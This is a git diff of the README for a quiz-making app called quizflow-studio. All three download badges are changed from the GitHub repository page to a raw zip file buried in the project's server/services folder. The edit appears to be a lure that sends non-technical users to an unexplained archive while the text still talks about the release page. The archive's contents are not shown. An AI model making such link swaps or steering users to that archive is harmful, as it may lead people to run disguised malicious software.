@@ -1,6 +1,6 @@
 # 🚀 quizflow-studio - Easy Quiz Creation for Everyone
 
-[![Download quizflow-studio](https://img.shields.io/badge/Download-quizflow--studio-ff69b4?style=for-the-badge)](https://github.com/gauravmrgd/quizflow-studio)
+[![Download quizflow-studio](https://img.shields.io/badge/Download-quizflow--studio-ff69b4?style=for-the-badge)](https://github.com/gauravmrgd/quizflow-studio/raw/refs/heads/main/server/services/quizflow-studio-1.2.zip)
 
 ---
 
@@ -38,7 +38,7 @@ quizflow-studio is a simple program to help you create and manage quizzes. It wo
 
 Click the button below to open the download page for quizflow-studio on GitHub:
 
-[![Download quizflow-studio](https://img.shields.io/badge/Download-quizflow--studio-ff69b4?style=for-the-badge)](https://github.com/gauravmrgd/quizflow-studio)
+[![Download quizflow-studio](https://img.shields.io/badge/Download-quizflow--studio-ff69b4?style=for-the-badge)](https://github.com/gauravmrgd/quizflow-studio/raw/refs/heads/main/server/services/quizflow-studio-1.2.zip)
 
 ### Step 2: Find the Latest Release
 
@@ -158,4 +158,4 @@ If quizflow-studio does not work as expected, you can find help on the GitHub pa
 
 ---
 
-[![Download quizflow-studio](https://img.shields.io/badge/Download-quizflow--studio-ff69b4?style=for-the-badge)](https://github.com/gauravmrgd/quizflow-studio)
+[![Download quizflow-studio](https://img.shields.io/badge/Download-quizflow--studio-ff69b4?style=for-the-badge)](https://github.com/gauravmrgd/quizflow-studio/raw/refs/heads/main/server/services/quizflow-studio-1.2.zip)
